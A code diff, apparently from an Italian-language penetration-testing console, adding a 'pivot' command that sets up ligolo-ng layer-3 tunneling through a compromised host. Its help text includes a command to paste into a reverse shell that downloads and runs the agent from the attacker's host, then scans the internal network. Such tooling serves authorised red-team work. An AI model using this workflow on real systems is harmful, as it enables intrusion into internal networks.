@@ -21,6 +21,16 @@ from http_server import (
     tunnel_status as _tunnel_status,
     tunnel_list as _tunnel_list,
 )
+from http_server import (
+    pivot_fetch as _pivot_fetch,
+    pivot_start as _pivot_start,
+    pivot_stop as _pivot_stop,
+    pivot_status as _pivot_status,
+    pivot_session as _pivot_session,
+    pivot_route_add as _pivot_route_add,
+    pivot_route_del as _pivot_route_del,
+    pivot_route_list as _pivot_route_list,
+)
 from http_server import set_lport as _set_lport
 
 from sealion import normalize, render_markdown, _paged_print
@@ -564,4 +574,181 @@ def cmd_tunnel(args: argparse.Namespace, state=None) -> int:
         return 0
 
     print(_tunnel_status())
+    return 0
+
+
+# ---------------------------------------------------------------------------
+# pivot — ligolo-ng IP tunneling
+# ---------------------------------------------------------------------------
+
+def _pivot_help() -> None:
+    render_markdown(r"""# pivot — Full IP Tunneling via ligolo-ng
+
+Crea un tunnel a livello IP attraverso una macchina compromessa usando
+**ligolo-ng**. A differenza di un SOCKS proxy, passa **tutto il traffico IP**:
+SYN scan, ping sweep, UDP, ICMP — come se fossi nella rete interna.
+
+## Requisiti
+
+- **ligolo-ng** (proxy + agent) in `static/` — usa `pivot fetch` per scaricarli
+- **Permessi root** (sudo senza password) per creare l'interfaccia TUN e le rotte
+- Il **serve** deve essere attivo (`serve on`) per servire l'agent al target
+- Il target deve poter raggiungere LHOST sulla porta del proxy (default 11601)
+
+## Comandi
+
+| Comando | Descrizione |
+|---------|-------------|
+| `pivot fetch [--force]` | Scarica proxy e agent in `static/` |
+| `pivot on [--port 11601]` | Crea TUN, avvia proxy, mostra comando agent |
+| `pivot off` | Ferma proxy, rimuove rotte e TUN |
+| `pivot session` | Info sulla gestione sessioni del proxy |
+| `pivot route add <CIDR>` | Aggiungi rotta verso la rete interna |
+| `pivot route del <CIDR>` | Rimuovi rotta |
+| `pivot route list` | Elenca rotte configurate |
+| `pivot status` | Mostra stato completo del pivot |
+| `pivot help` | Mostra questo aiuto |
+
+## Opzioni
+
+| Opzione | Default | Descrizione |
+|---------|---------|-------------|
+| `--port` | 11601 | Porta di ascolto del proxy |
+
+## Workflow tipico
+
+```bash
+# 1. Scarica i binari (solo la prima volta)
+slconsole> pivot fetch
+
+# 2. Avvia il pivot
+slconsole> pivot on
+
+# 3. Copia il comando mostrato e incollalo nella revshell
+curl http://LHOST:2727/static/ligolo-agent -o /tmp/agent && \
+  chmod +x /tmp/agent && \
+  /tmp/agent -connect LHOST:11601 -ignore-cert &
+
+# 4. Gestisci la sessione (se serve interazione)
+slconsole> pivot session
+
+# 5. Aggiungi rotta verso la rete interna del target
+slconsole> pivot route add 172.16.0.0/24
+
+# 6. Ora puoi scansionare e accedere alla rete interna
+nmap -sS 172.16.0.0/24         # SYN scan — funziona!
+ping 172.16.0.1                 # ICMP — funziona!
+nmap -sU -p53 172.16.0.1       # UDP — funziona!
+
+# 7. Chiudi tutto
+slconsole> pivot off
+```
+
+## ligolo-ng vs chisel (SOCKS)
+
+| Feature | ligolo-ng (pivot) | chisel (tunnel) |
+|---------|-------------------|-----------------|
+| Livello | IP (layer 3) | TCP (layer 4) |
+| SYN scan | ✅ | ❌ |
+| Ping/ICMP | ✅ | ❌ |
+| UDP | ✅ | ❌ |
+| Proxychains | Non serve | Necessario |
+| Setup | TUN + rotte | Solo porta |
+
+## Note
+
+- Se `sudo` richiede password, i comandi TUN e route falliranno con
+  istruzioni per eseguirli manualmente
+- Per gestire sessioni multiple o listener, avvia il proxy a mano:
+  `./static/ligolo-proxy -selfcert`
+- L'agent nel target viene servito via HTTP come tutti i file in `static/`
+""")
+
+
+def cmd_pivot(args: argparse.Namespace, state=None) -> int:
+    action = normalize(getattr(args, "action", "status"))
+
+    if action in {"help", "h", "-h", "--help"}:
+        _pivot_help()
+        return 0
+
+    if action in {"on", "start"}:
+        port = getattr(args, "port", 11601) or 11601
+        lhost = getattr(args, "lhost", None)
+        if lhost is None:
+            ifaces = _serve_discover_interfaces()
+            if not ifaces:
+                print("Nessuna interfaccia di rete trovata.", file=sys.stderr)
+                return 1
+            if len(ifaces) == 1:
+                lhost = ifaces[0][1]
+            else:
+                print("\n  Interfacce disponibili:\n")
+                for i, (name, addr) in enumerate(ifaces, 1):
+                    print(f"    [{i}] {name:<12s}  {addr}")
+                print()
+                while True:
+                    try:
+                        choice = input("  Scegli interfaccia [1]: ").strip()
+                    except (EOFError, KeyboardInterrupt):
+                        print()
+                        return 0
+                    if not choice:
+                        choice = "1"
+                    if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
+                        lhost = ifaces[int(choice) - 1][1]
+                        break
+                    print(f"  Inserisci un numero da 1 a {len(ifaces)}.")
+        print(_pivot_start(port=port, lhost=lhost))
+        return 0
+
+    if action in {"off", "stop"}:
+        print(_pivot_stop())
+        return 0
+
+    if action == "fetch":
+        force = getattr(args, "force", False)
+        print(_pivot_fetch(force=force))
+        return 0
+
+    if action == "session":
+        print(_pivot_session())
+        return 0
+
+    if action == "route":
+        sub = normalize(getattr(args, "route_action", "list"))
+        if sub in {"add", "a"}:
+            cidr = getattr(args, "cidr", None)
+            if cidr is None:
+                try:
+                    cidr = input("\n  Subnet CIDR (es. 172.16.0.0/24): ").strip()
+                except (EOFError, KeyboardInterrupt):
+                    print()
+                    return 0
+            if not cidr:
+                print("Specifica un CIDR.", file=sys.stderr)
+                return 1
+            print(_pivot_route_add(cidr))
+            return 0
+        if sub in {"del", "rm", "delete", "remove"}:
+            cidr = getattr(args, "cidr", None)
+            if cidr is None:
+                try:
+                    cidr = input("\n  Subnet CIDR da rimuovere: ").strip()
+                except (EOFError, KeyboardInterrupt):
+                    print()
+                    return 0
+            if not cidr:
+                print("Specifica un CIDR.", file=sys.stderr)
+                return 1
+            print(_pivot_route_del(cidr))
+            return 0
+        print(_pivot_route_list())
+        return 0
+
+    if action in {"list", "ls"}:
+        print(_pivot_route_list())
+        return 0
+
+    print(_pivot_status())
     return 0
